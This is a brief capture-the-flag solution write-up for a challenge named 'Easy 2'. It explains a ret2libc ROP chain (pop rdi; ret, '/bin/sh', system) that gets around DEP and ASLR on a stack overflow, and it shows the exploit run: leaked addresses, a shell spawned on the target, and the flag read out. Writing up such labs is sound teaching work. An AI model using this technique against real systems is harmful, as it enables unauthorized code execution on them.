# Easy 2 Solution
*by Javantea*  
Jun 11, 2019 - Jun 12, 2019

Stack overflow with dep and aslr. You have one pointer, libc, and the binary.

Find one gadget or put the known /bin/sh into rdi with a gadget.

My solution: Find /bin/sh, find pop rdi; ret, then compose as:
```
pop rdi ret; /bin/sh; system
```

```
python3 solve.py deb1a 3001
b'system: 0x7efcd684562b\n' we have: 0x7efcd684562b
binsh: 0x7efcd6892ed9
base: 0x7efcd6806000
poprdi_ret: 0x7efcd681d3b9
press any key 
read 4095
read 4095
read 2121
 unicode b'\xb9\xd3\x81\xd6\xfc~\n/bin/'
sh: can't access tty; job control turned off
/ # ^[[40;5Rls
sending  b'\x1b[40;5Rls\n'
ls
bin    easy2  flag   lib    media  opt    root   sbin   sys    usr
dev    etc    home   lib64  mnt    proc   run    srv    tmp    var
/ # ^[[40;5Rdf
sending  b'\x1b[40;5Rdf\n'
df
Filesystem           1K-blocks      Used Available Use% Mounted on
overlay               39989536   2499740  35428740   7% /
tmpfs                    65536         0     65536   0% /dev
tmpfs                   510148         0    510148   0% /sys/fs/cgroup
/dev/sda1             39989536   2499740  35428740   7% /etc/resolv.conf
/dev/sda1             39989536   2499740  35428740   7% /etc/hostname
/dev/sda1             39989536   2499740  35428740   7% /etc/hosts
shm                      65536         0     65536   0% /dev/shm
tmpfs                   510148         0    510148   0% /proc/acpi
tmpfs                    65536         0     65536   0% /proc/kcore
tmpfs                    65536         0     65536   0% /proc/keys
tmpfs                    65536         0     65536   0% /proc/timer_list
tmpfs                    65536         0     65536   0% /proc/sched_debug
tmpfs                   510148         0    510148   0% /sys/firmware
/ # ^[[40;5Rcat flag
sending  b'\x1b[40;5Rcat flag\n'
cat flag
f149{d3p_i5_not_as_easy_as_it_sounds. You okay?}
/ # ^[[40;5R
```
